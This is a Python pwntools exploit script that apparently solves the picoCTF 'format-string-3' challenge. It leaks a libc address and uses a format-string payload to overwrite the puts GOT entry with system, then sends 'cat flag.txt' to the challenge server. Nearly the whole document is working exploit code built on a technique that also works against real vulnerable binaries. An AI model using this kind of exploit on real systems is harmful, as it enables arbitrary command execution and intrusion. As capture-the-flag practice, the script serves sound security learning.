#!/usr/bin/env python3

from pwn import *

exe = ELF("./format-string-3")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

def main():
    if args.REMOTE:
        r = remote('rhea.picoctf.net', 53606)
    else:
        r = process(exe.path)

    r.recvuntil(b'0x')
    setvbuf_addr = int(r.recvline().strip().decode(), 16)
    libc.address = setvbuf_addr - libc.sym['setvbuf']

    log.success(f'libc address: {hex(libc.address)}')

    payload = fmtstr_payload(38, {exe.got['puts']: libc.sym['system']}, write_size='byte')
    r.sendline(payload)

    r.sendline(b'cat flag.txt')
    print(r.recvall(timeout=1))
    r.close()


if __name__ == "__main__":
    main()
